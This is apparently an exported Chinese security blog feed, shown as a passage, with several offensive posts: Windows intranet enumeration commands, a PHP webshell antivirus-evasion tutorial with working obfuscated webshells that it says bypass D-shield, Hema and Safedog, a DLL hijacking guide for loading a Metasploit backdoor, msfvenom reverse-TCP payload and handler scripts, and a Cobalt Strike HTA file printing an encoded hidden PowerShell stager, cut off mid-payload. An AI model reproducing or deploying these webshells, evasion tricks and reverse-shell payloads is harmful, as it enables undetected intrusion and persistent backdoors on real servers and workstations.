title="系统版本"></a>系统版本</h4><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">ver</span> 查看当前服务器操作系统版本<br>systeminfo 查看当前系统版本与补丁信息<br></code></pre></td></tr></table></figure><h4 id="启动信息-1"><a href="#启动信息-1" class="headerlink" title="启动信息"></a>启动信息</h4></li><li>查看自启动项<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">dir &quot;C:<span class="hljs-symbol">\P</span>rogramData<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>tart Menu<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\S</span>tartUp&quot;<br></code></pre></td></tr></table></figure><h4 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h4></li><li>查看计划任务<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">schtasks /<span class="hljs-keyword">query</span><br></code></pre></td></tr></table></figure><h4 id="后缀信息-1"><a href="#后缀信息-1" class="headerlink" title="后缀信息"></a>后缀信息</h4></li><li>查看文件关联<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">assoc</span> .txt<br><span class="hljs-built_in">ftype</span> | <span class="hljs-built_in">findstr</span> txt<br></code></pre></td></tr></table></figure><h4 id="注册表项"><a href="#注册表项" class="headerlink" title="注册表项"></a>注册表项</h4></li><li>开启3389端口<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-regexp">/v fDenyTSConnections /</span>t REG_DWORD <span class="hljs-regexp">/d 00000000 /</span>f<br></code></pre></td></tr></table></figure></li><li>关闭3389端口<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-regexp">/v fDenyTSConnections /</span>t REG_DWORD <span class="hljs-regexp">/d 00000000 /</span>f<br></code></pre></td></tr></table></figure><h4 id="域内信息"><a href="#域内信息" class="headerlink" title="域内信息"></a>域内信息</h4></li></ol><h4 id="密码信息-1"><a href="#密码信息-1" class="headerlink" title="密码信息"></a>密码信息</h4><h4 id="票据信息-1"><a href="#票据信息-1" class="headerlink" title="票据信息"></a>票据信息</h4><h4 id="服务信息-1"><a href="#服务信息-1" class="headerlink" title="服务信息"></a>服务信息</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">tasklist /svc<br><span class="hljs-built_in">sc</span> query<br>wmic service list brief<br><span class="hljs-built_in">Get-WmiObject</span> win32_service | <span class="hljs-built_in">select</span> PathName<br></code></pre></td></tr></table></figure><h4 id="磁盘信息-1"><a href="#磁盘信息-1" class="headerlink" title="磁盘信息"></a>磁盘信息</h4><h4 id="网络信息-1"><a href="#网络信息-1" class="headerlink" title="网络信息"></a>网络信息</h4><ol><li>查看网络信息<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ipconfig<br>arp -a<br>route print<br>netstat -anot<br>Get-NetTCPConnection<br></code></pre></td></tr></table></figure><h4 id="文件信息-1"><a href="#文件信息-1" class="headerlink" title="文件信息"></a>文件信息</h4></li></ol><h4 id="日志信息-1"><a href="#日志信息-1" class="headerlink" title="日志信息"></a>日志信息</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">eventvwr</span><br></code></pre></td></tr></table></figure><h4 id="软件信息-1"><a href="#软件信息-1" class="headerlink" title="软件信息"></a>软件信息</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">wmic product <span class="hljs-keyword">get</span> <span class="hljs-built_in">name</span>,<span class="hljs-built_in">version</span><br></code></pre></td></tr></table></figure><h4 id="驱动信息-1"><a href="#驱动信息-1" class="headerlink" title="驱动信息"></a>驱动信息</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">DRIVERQUERY <span class="hljs-string">/V</span><br></code></pre></td></tr></table></figure><h4 id="后缀信息-2"><a href="#后缀信息-2" class="headerlink" title="后缀信息"></a>后缀信息</h4><h4 id="注册表信息-1"><a href="#注册表信息-1" class="headerlink" title="注册表信息"></a>注册表信息</h4><h4 id="防火墙信息-1"><a href="#防火墙信息-1" class="headerlink" title="防火墙信息"></a>防火墙信息</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netsh advfirewall firewall</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP免杀</title>
      <link href="2022/09/11/PHP%E5%85%8D%E6%9D%80/"/>
      <url>2022/09/11/PHP%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><p>免杀就是制作开发的病毒木马（脚本或者二进制）不被杀毒软件检测出。<br>而对于web手而言，最熟悉，也是最好入手的就是php免杀</p><a id="more"></a><h2 id="免杀思路"><a href="#免杀思路" class="headerlink" title="免杀思路"></a>免杀思路</h2><p>分析杀软（WAF）,为什么杀你制作的病毒木马,是规则匹配引擎，是机器学习引擎，等等。只有你知道WAF为什么查杀你，你才知道如何绕过，达到免杀效果。</p><h2 id="免杀过程"><a href="#免杀过程" class="headerlink" title="免杀过程"></a>免杀过程</h2><ol><li>定位关键点</li><li>分析关键点</li><li>混淆关键点</li></ol><h2 id="杀软类型"><a href="#杀软类型" class="headerlink" title="杀软类型"></a>杀软类型</h2><ol><li>本地杀软</li><li>云端杀软</li><li>二进制杀软</li><li>脚本杀软</li></ol><h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><ol><li>工具免杀</li><li>代码膨胀（增加代码量）</li><li>多层函数嵌套</li></ol><h3 id="本地杀软"><a href="#本地杀软" class="headerlink" title="本地杀软"></a>本地杀软</h3><p>本地杀软主要是绕过火绒，安全狗，D盾，河马等，而本地杀软对比起其他方式，对于攻击者来说是最友好的，因为本地杀软100%可以确定能不能绕过，只有两个结果，清楚明确，不需要猜测。</p><h4 id="测试免杀D盾"><a href="#测试免杀D盾" class="headerlink" title="测试免杀D盾"></a>测试免杀D盾</h4><p>首先写最简单的一句话木马试试</p><p><img src="https://s2.loli.net/2022/09/11/dXptJhWv5Zf7V8B.png" alt="D盾成功拦截"></p><p>再试试我们常用方法中的代码膨胀，主要是向其注入足够的垃圾数据，来绕过本地杀软软件</p><p><img src="https://s2.loli.net/2022/09/11/N6du4mY2nLStMJq.png" alt="代码膨胀免杀失败"></p><p>按照我们的免杀过程，我们先定位关键点，先判断是否过滤了system函数</p><p><img src="https://s2.loli.net/2022/09/11/2zX7mR6Ww1tHQvA.png" alt="system($a);被查杀"><br><img src="https://s2.loli.net/2022/09/11/GeWxXS5IluTyo6m.png" alt="system();函数能够正常使用"></p><p>因此判断，D盾会检查system函数中的参数，来判断其安全性</p><p>依然是过滤参数，我们先试一下用class是否能绕过<br><img src="https://s2.loli.net/2022/09/11/dYfAHs18LGwS9kQ.png" alt="使用class免杀失败"></p><p>还是被查杀了，既然都想到用类了，那就再序列化试一下<br><img src="https://s2.loli.net/2022/09/11/EZmcxgUQ3nAGTpr.png" alt="序列化免杀成功"></p><p>经过序列化之后，我们成功绕过了，但这样是无法成功执行的，我们只需要截取序列化中的关键词出来就行<br><img src="https://s2.loli.net/2022/09/11/4sHpu1UyRfSXk8a.png" alt="免杀成功"><br><img src="https://s2.loli.net/2022/09/11/GODHnIyg2615dqS.png" alt="命令执行成功"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;calc&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getC</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> C;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$l</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;l&quot;</span>];<br>system(substr(serialize(getC()),<span class="hljs-number">26</span>,<span class="hljs-variable">$l</span>));<br>&#125;<br><br>test(<span class="hljs-string">&quot;aa&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="测试免杀河马"><a href="#测试免杀河马" class="headerlink" title="测试免杀河马"></a>测试免杀河马</h4><p>我们先尝试用之前成功免杀D盾的代码来测试一下河马</p><p><img src="https://s2.loli.net/2022/09/11/MIo57bqju1CESeT.png" alt="被河马查杀"><br>能绕过D盾的代码直接被河马查杀了</p><p>还是按照上面的思路，我们先定位关键点<br><img src="https://s2.loli.net/2022/09/11/dE8Bq1hpwFkLYi6.png"><br>发现河马直接过滤掉了system()，无论是否带有参数都直接查杀，挺狗的<br>接着尝试，发现eval()函数可以使用，但用eval()函数去调用system()也会被查杀<br>用编码绕过试一下</p><p>将<code>system(calc);</code>base64编码得到<code>c3lzdGVtKCdjbGFjJyk7</code><br><img src="https://s2.loli.net/2022/09/11/I9WHr7kjJp3c2CY.png" alt="被河马查杀"></p><p>仍然不能绕过，貌似会检测到base64_decode函数，网上找一个手写的脚本，改个函数名试试</p><p><img src="https://s2.loli.net/2022/09/11/iq5KD4AWtwXpIdx.png" alt="还是被查杀"><br>好怪啊，怎么这样还是被查杀，莫非是河马自己后台用php跑一遍测试，或者是跟随了你的代码执行顺序逐句查杀</p><p><img src="https://s2.loli.net/2022/09/11/VLxrkvyQon2WEp3.png"><br>不是吧，这样还是被查杀了，按照代码执行顺序也不对呀</p><p>再反复测试，反复调试了一个下午，最后发现</p><blockquote><p>查杀了注释！！！</p></blockquote><p><img src="https://s2.loli.net/2022/09/11/pKB6mNe7t5Ab24C.png" alt="成功免杀"><br>这次终于对了，删掉了注释，按照代码执行顺序，执行不到eval()函数，成功绕过了河马<br>那我们接下来只需要让它无法判断是否该执行if条件中的语句，就能成功绕过</p><p><img src="https://s2.loli.net/2022/09/11/M9w2AGPfQbXkSLt.png" alt="成功执行命令"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Glacier</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>) </span>&#123;<br><span class="hljs-variable">$keyStr</span> = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;<br><span class="hljs-variable">$chr1</span> = <span class="hljs-variable">$chr2</span> = <span class="hljs-variable">$chr3</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$enc1</span> = <span class="hljs-variable">$enc2</span> = <span class="hljs-variable">$enc3</span> = <span class="hljs-variable">$enc4</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$output</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$input</span> = preg_replace(<span class="hljs-string">&quot;[^A-Za-z0-9\+\/\=]&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$input</span>);<br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-variable">$enc1</span> = strpos(<span class="hljs-variable">$keyStr</span>, substr(<span class="hljs-variable">$input</span>, <span class="hljs-variable">$i</span>++, <span class="hljs-number">1</span>));<br><span class="hljs-variable">$enc2</span> = strpos(<span class="hljs-variable">$keyStr</span>, substr(<span class="hljs-variable">$input</span>, <span class="hljs-variable">$i</span>++, <span class="hljs-number">1</span>));<br><span class="hljs-variable">$enc3</span> = strpos(<span class="hljs-variable">$keyStr</span>, substr(<span class="hljs-variable">$input</span>, <span class="hljs-variable">$i</span>++, <span class="hljs-number">1</span>));<br><span class="hljs-variable">$enc4</span> = strpos(<span class="hljs-variable">$keyStr</span>, substr(<span class="hljs-variable">$input</span>, <span class="hljs-variable">$i</span>++, <span class="hljs-number">1</span>));<br><span class="hljs-variable">$chr1</span> = (<span class="hljs-variable">$enc1</span> &lt;&lt; <span class="hljs-number">2</span>) | (<span class="hljs-variable">$enc2</span> &gt;&gt; <span class="hljs-number">4</span>);<br><span class="hljs-variable">$chr2</span> = ((<span class="hljs-variable">$enc2</span> &amp; <span class="hljs-number">15</span>) &lt;&lt; <span class="hljs-number">4</span>) | (<span class="hljs-variable">$enc3</span> &gt;&gt; <span class="hljs-number">2</span>);<br><span class="hljs-variable">$chr3</span> = ((<span class="hljs-variable">$enc3</span> &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">6</span>) | <span class="hljs-variable">$enc4</span>;<br><span class="hljs-variable">$output</span> = <span class="hljs-variable">$output</span> . chr((<span class="hljs-keyword">int</span>) <span class="hljs-variable">$chr1</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$enc3</span> != <span class="hljs-number">64</span>) &#123;<br><span class="hljs-variable">$output</span> = <span class="hljs-variable">$output</span> . chr((<span class="hljs-keyword">int</span>) <span class="hljs-variable">$chr2</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$enc4</span> != <span class="hljs-number">64</span>) &#123;<br><span class="hljs-variable">$output</span> = <span class="hljs-variable">$output</span> . chr((<span class="hljs-keyword">int</span>) <span class="hljs-variable">$chr3</span>);<br>&#125;<br><span class="hljs-variable">$chr1</span> = <span class="hljs-variable">$chr2</span> = <span class="hljs-variable">$chr3</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$enc1</span> = <span class="hljs-variable">$enc2</span> = <span class="hljs-variable">$enc3</span> = <span class="hljs-variable">$enc4</span> = <span class="hljs-string">&quot;&quot;</span>;<br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$input</span>));<br><span class="hljs-keyword">return</span> urldecode(<span class="hljs-variable">$output</span>);<br>&#125;<br><br><span class="hljs-variable">$b</span> = Glacier(<span class="hljs-string">&quot;c3lzdGVtKCdjYWxjJyk7&quot;</span>); <br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>] &gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>])&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$b</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里的函数是用的网上别人手写的base64，其实也可以直接用php库中的其他编码形式来绕过河马。</p><h4 id="测试免杀safedog"><a href="#测试免杀safedog" class="headerlink" title="测试免杀safedog"></a>测试免杀safedog</h4><p>使用绕过河马的exp会被safedog拦截，测试发现其是逻辑过滤了eval的参数，那我们换个php的原生函数试一试</p><p>这里的分析过程与上面类似，我们使用了php的原生函数<code>call_user_fnuc(&quot;aa&quot;,$_GET[&quot;a&quot;])</code><br>这里直接贴上exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aa</span> (<span class="hljs-params"><span class="hljs-variable">$cc</span></span>)</span>&#123;<br>    system(<span class="hljs-variable">$cc</span>);<br>&#125;<br><span class="hljs-keyword">eval</span>(call_user_func(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/09/11/nCNcuOeiJFK6vzG.png" alt="成功绕过安全狗"><br><img src="https://s2.loli.net/2022/09/11/h8XkPlDoswtg6fB.png" alt="命令执行成功"></p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dll劫持与AheadLib</title>
      <link href="2022/08/18/dll%E5%8A%AB%E6%8C%81%E4%B8%8EAheadLib/"/>
      <url>2022/08/18/dll%E5%8A%AB%E6%8C%81%E4%B8%8EAheadLib/</url>
      
        <content type="html"><![CDATA[<h1 id="dll劫持与AheadLib"><a href="#dll劫持与AheadLib" class="headerlink" title="dll劫持与AheadLib"></a>dll劫持与AheadLib</h1><p>最近在看msf配置信息的时候，看到生成dll文件，突然就想到了dll劫持，于是准备来折腾一下</p><a id="more"></a><h2 id="dll劫持"><a href="#dll劫持" class="headerlink" title="dll劫持"></a>dll劫持</h2><p>dll文件是计算机上的一类文件，提供给使用者一些开箱即用的变量、函数或类。库文件分为静态库和动态库，静态库和动态库的区别体现在程序的链接阶段：静态库在程序的链接阶段被复制到了程序中；动态库在链接阶段没有被复制到程序中，而是程序在运行时由系统动态加载到内存中供程序调用。使用动态库系统只需载入一次，不同的程序可以得到内存中相同的动态库的副本，因此节省了很多内存，而且使用动态库也便于模块化更新程序</p><p>dll劫持是当一个可执行文件运行时，Windows加载器将可执行模块映射到进程的地址空间中，加载器分析可执行模块的输入表，并设法找出任何需要的DLL，并将它们映射到进程的地址空间</p><blockquote><p>简单来说，dll的存在就是方便程序来直接调用，避免将相同的内容重复多遍，以此来节省内存<br>而dll劫持，由下面一个例子说明</p></blockquote><p>一个可执行文件运行时，需要调用<code>test.dll</code>文件，但此时我们可以生成一个恶意的<code>test.dll</code>文件，并让他调用我们由msf生成的<code>shell.dll</code>或者其他后门，再调用原来的<code>test.dll</code>文件</p><p><img src="https://s2.loli.net/2022/08/18/kgBDKU17lNzXWQa.png" alt="图解dll劫持"></p><p>如果dll劫持成功了，那原本的可执行文件仍将正常使用，但我们的后门也将成功执行，即msf上线</p><h2 id="AheadLib"><a href="#AheadLib" class="headerlink" title="AheadLib"></a>AheadLib</h2><p>这里推荐一个用来生成dll转发的工具<a href="https://github.com/Yonsm/AheadLib">AheadLib</a></p><p>我们随便找一个dll文件来测试一下</p><p><img src="https://s2.loli.net/2022/08/18/wp5fkSX9FNlmr2L.png"></p><p>我们把它生成的代码复制下来，用VisualStudio创建一个dll动态链接项目，但在这里，可能会出现比较多的问题<br>我这里使用的是ViusalStudio 2019 不同的版本可能会出现的问题不同</p><p>首先项目提示我没有引入头文件，于是我加上了<code>#include &quot;pch.h&quot;</code><br>紧接着出现了如下的报错</p><p><img src="https://s2.loli.net/2022/08/18/BAQiGUXbHg3z8wC.png"></p><p>解决方法是，在<code>项目-&gt;属性-&gt;高级-&gt;字符集</code> 改为使用多字节字符集</p><p><img src="https://s2.loli.net/2022/08/18/1JIjvcpbeUgOWFq.png"></p><p>其他版本的可能存在不同的报错，可以尝试如下方法</p><ol><li>将运行库改为多线程(/MT)<br><img src="https://s2.loli.net/2022/08/18/zank6NWHustC2cR.png"></li><li>将预编译头改为不使用<br><img src="https://s2.loli.net/2022/08/18/1ka4ZxJv6BO32WD.png"></li></ol><p>确认应用之后就只会有一个报错，我们不用管它，在Release x86的模式下，成功生成dll文件<br>成功处理好报错信息后，我们实现了由<code>test(evil).dll -&gt; test(org).dll</code><br>接下来实现<code>test(evil).dll-&gt;shell.dll</code><br>我们在AheadLib工具生成的cpp文件中，找到<code>DLLMain</code>函数，并加上我们需要调用的后门<code>shell.dll</code></p><p><img src="https://s2.loli.net/2022/08/18/Qrme8qxodRO3NGs.png"></p><p>成功编译后，将生成的dll文件改为与原dll相同的名字，即<code>test.dll</code>，将原本的test.dll改为<code>testorg.dll</code><br>这样我们就完成了dll劫持，当运行可执行文件时，将会先调用我们改写的<code>test.dll</code></p><p>最后，msf成功上线</p><p><img src="https://s2.loli.net/2022/08/18/ylZoMNxTp2Pfire.png"></p><hr><h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>最近浅浅的看了下sh文件的写法，于是就想到了写一些msf的sh文件，避免了每次使用msfconsole的复杂配置与msfvenum生成的复杂参数</p><blockquote><p>msfvenum的生成</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">ip=192.168.31.208<br>port=4444<br>arch=x86<br>platform=windows<br>format=exe<br>payload=windows/meterpreter/reverse_tcp<br><span class="hljs-comment">#use exploit/muilt/handler</span><br>out=../meter_re_tcp_x86.exe<br><br>msfvenom -p <span class="hljs-variable">$payload</span> LHOST=<span class="hljs-variable">$ip</span> LPORT=<span class="hljs-variable">$port</span> -f <span class="hljs-variable">$format</span> -a <span class="hljs-variable">$arch</span> --platform <span class="hljs-variable">$platform</span> -o <span class="hljs-variable">$out</span><br></code></pre></td></tr></table></figure><blockquote><p>msfconsole的监听</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">use exploit/multi/handler<br><span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 192.168.31.208<br><span class="hljs-built_in">set</span> LPORT 4444<br>run<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dll劫持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS生成hta分析与powershell免杀</title>
      <link href="2022/08/16/CS%E7%94%9F%E6%88%90hta%E5%88%86%E6%9E%90%E4%B8%8Epowershell%E5%85%8D%E6%9D%80/"/>
      <url>2022/08/16/CS%E7%94%9F%E6%88%90hta%E5%88%86%E6%9E%90%E4%B8%8Epowershell%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="CS生成hta分析与powershell免杀"><a href="#CS生成hta分析与powershell免杀" class="headerlink" title="CS生成hta分析与powershell免杀"></a>CS生成hta分析与powershell免杀</h1><p>看着自己刚开始入门写的wp，才发现自己从来没正儿八经写过啥博客，最近遇到了一群朋友及其博客，于是准备记录一点有质量的内容</p><a id="more"></a><h2 id="hta文件分析"><a href="#hta文件分析" class="headerlink" title="hta文件分析"></a>hta文件分析</h2><p>hta文件是CS钓鱼经常会用到的一种攻击手法，但我从未考虑过里面的内容，今天突发奇想，想来看看里面到底写了些什么东西，并且杀毒软件是对于哪一部分进行了扫描并且报毒</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs VBScript">&lt;script language=<span class="hljs-string">&quot;VBScript&quot;</span>&gt;<br><span class="hljs-keyword">Function</span> var_func()<br><span class="hljs-keyword">Dim</span> var_shell<br><span class="hljs-keyword">Set</span> var_shell = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>)<br>var_shell.run <span class="hljs-string">&quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEALwA3AFYAWABhADIALwBpAFMAaABMADkASABIADYARgBQADAAUQBDAGEAdwBpAFgAWQBNAGgAagBWAHAASABHAGcAQQAwAEcANwBBAEQAbQB6AFUAVgBSAHUANwBzAHgASgBuADUAaAB0AHoASABtAHoAdgB6ADMATABSAHYASQB6AGUAdwBrAHUAeQBQAHQATABwAEoARgB1ADcAdQBxAHUAdQByAFUANgBlAHEAeQBUAHQAbQBOAHoAZwBJAEwATQA5AFUAagBsAEwAdQBaADAAQwBDADAAUABKAGUAcgA1AEgATABYAFQAVQA5AGgAMwBCAFAAMwBMAFoAOQBiAFIAeQA1AG0ANgBYAFEANgBlAEQARQBwAGUALwBFAEQARAA3ADgAZwBRAGcASQBhAGgAdAB4AGYAdQBhAHMAKwBDAHAARABEAEYAYQA3ADMASwBIAGgAeABQAEIATABaAHQATQBoAGwATAA2AGsAZwBKAFYARgBBACsAYQB1AHIAMwBGAFUAMgBGAGIAawBoAFcAdABNAFgARgB6AEYAcgBUADEAOABjAHkAagBZAGUAQwBXAEcAagB3AGwATAAwAC8AYQBiAG4ASQBNAHQAZABmAGYAMwBhAGkASQBLAEEAdQB1AHoAMABYAG0AcABSAEoAbwBZAGgAZABRAHoAYgBvAG0ARwBCADUANwA1AHoAMAB3ADAATgA2AE0AMgB6AHMAYQBXAFkAYwBYADkAeAAxAHkAKwBsAGwAdQAwAFoAeQBEADYATABKAFEAMgBFAE4AeABDAFEANgBKAEoAMAByAGUAZABoAGwARQBaAFEAMABuADMAYgBZAG8AWAA4AG4AMwAvAG0AKwBlAFgATgA3AGEAbwBrADcAUwBKAGsAaAA0AFcAOABuAG8AUwBNAE8AaQBWAGkAMgAzAG0AZQArADgARwBuAEcANAA0AFMAbgB4AGIAeQBxAG8AVQBEAEwALwBUAFcAcgBEAFMAMQBYAEsARgBTAEcAbQBmAGUAYQA1AG4AegA2AHMAbgAzAFAASAArAE8AegBQAFEAUgB4AFAARgA1AGsASwBuAFYAawAwADQAaABEADgATQArAFkAQwBPAGUATQBNAHcAWAB1AFcAVwA2ADMAMwBLADEANAByADYAOQBlAFQATwBNAFgARwBZADUAdABLAFMANABqAEEAYQBlAHIAOQBOAGcAYgAyAEUAYQBsAHQAcgBJAEoAVABZAGQAMABqAFcAbwA1AFUATgBJAG4AMgB2AG0AZQBYAEEAaQBvAEMAdwBLAFgATwA3AGkAQwArAGoAdAB2AFYAZABhAHUASABZAGoAMgB5ADYAQwAzAGUAWAB2ADIAbAAwAFYATgBCAHAAZgB3AFAAMQBkAHAAYwBKADcASgBaAEQAcQBzADQAQQB2AG4AagBuAHgATwAzAEMAbwBHAFcAOQBPADUAaQBDAGMAWAA3AHgALwBSAHkANABlAGYAcgA4AFEAagBNAC8AOQB5AEgAMQBBAFYAVQBKAHQAYQBpAEoARwBYAHgAagBnACsANAA2AHIAdQBhAHUAcgBaAFQAYQBrAEUARQArAGgANwA0AFYAVwBwAHYAZgBFAGwAWQB1AGMAQwBrADQAZwA1AGcAVgBKAG0AcwA1AFIARQBGAEYAKwA5AFgAZAArAFQAdAB0AGUATgBNAFAAaQBwADQAWgB1AEwAMQBwAG4